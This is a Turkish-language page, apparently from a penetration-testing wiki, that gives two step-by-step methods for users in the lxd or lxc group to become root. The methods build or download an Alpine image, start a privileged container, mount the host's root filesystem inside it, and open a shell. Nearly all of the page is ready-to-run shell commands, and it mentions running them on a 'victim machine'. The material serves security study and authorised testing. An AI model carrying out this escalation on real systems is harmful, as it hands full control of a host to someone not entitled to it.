# lxd/lxc Grubu - Yetki Yükseltme

{{#include ../../../banners/hacktricks-training.md}}

Eğer _**lxd**_ **veya** _**lxc**_ **grubuna** ait iseniz, root olabilirsiniz.

## İnternetsiz Sömürü

### Yöntem 1

Güvenilir bir depodan lxd ile kullanmak için bir alpine imajı indirebilirsiniz. Canonical, sitesinde günlük derlemeler yayınlamaktadır: [https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/](https://images.lxd.canonical.com/images/alpine/3.18/amd64/default/) En yeni derlemeden hem **lxd.tar.xz** hem de **rootfs.squashfs** dosyalarını alın. (Dizin adı tarihtir).

Alternatif olarak, bu dağıtım oluşturucusunu makinenize kurabilirsiniz: [https://github.com/lxc/distrobuilder](https://github.com/lxc/distrobuilder) (github talimatlarını takip edin):
```bash
# Install requirements
sudo apt update
sudo apt install -y golang-go gcc debootstrap rsync gpg squashfs-tools git make build-essential libwin-hivex-perl wimtools genisoimage

# Clone repo
mkdir -p $HOME/go/src/github.com/lxc/
cd $HOME/go/src/github.com/lxc/
git clone https://github.com/lxc/distrobuilder

# Make distrobuilder
cd ./distrobuilder
make

# Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml

# Create the container - Beware of architecture while compiling locally.
sudo $HOME/go/bin/distrobuilder build-incus alpine.yaml -o image.release=3.18 -o image.architecture=x86_64
```
**incus.tar.xz** dosyasını (**Canonical deposundan indirdiyseniz **lxd.tar.xz**) ve **rootfs.squashfs** dosyasını yükleyin, resmi depoya ekleyin ve bir konteyner oluşturun:
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine

# Check the image is there
lxc image list

# Create the container
lxc init alpine privesc -c security.privileged=true

# List containers
lxc list

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
> [!CAUTION]
> Eğer bu hatayı _**Hata: Depo havuzu bulunamadı. Lütfen yeni bir depo havuzu oluşturun**_\
> bulursanız, **`lxd init`** komutunu çalıştırın ve tüm seçenekleri varsayılan olarak ayarlayın. Ardından **önceki** komutlar grubunu **tekrar** edin

Sonunda konteyneri çalıştırabilir ve root alabilirsiniz:
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
### Yöntem 2

Bir Alpine imajı oluşturun ve `security.privileged=true` bayrağını kullanarak başlatın, bu da konteynerin ana dosya sistemi ile root olarak etkileşimde bulunmasını zorlar.
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```
{{#include ../../../banners/hacktricks-training.md}}
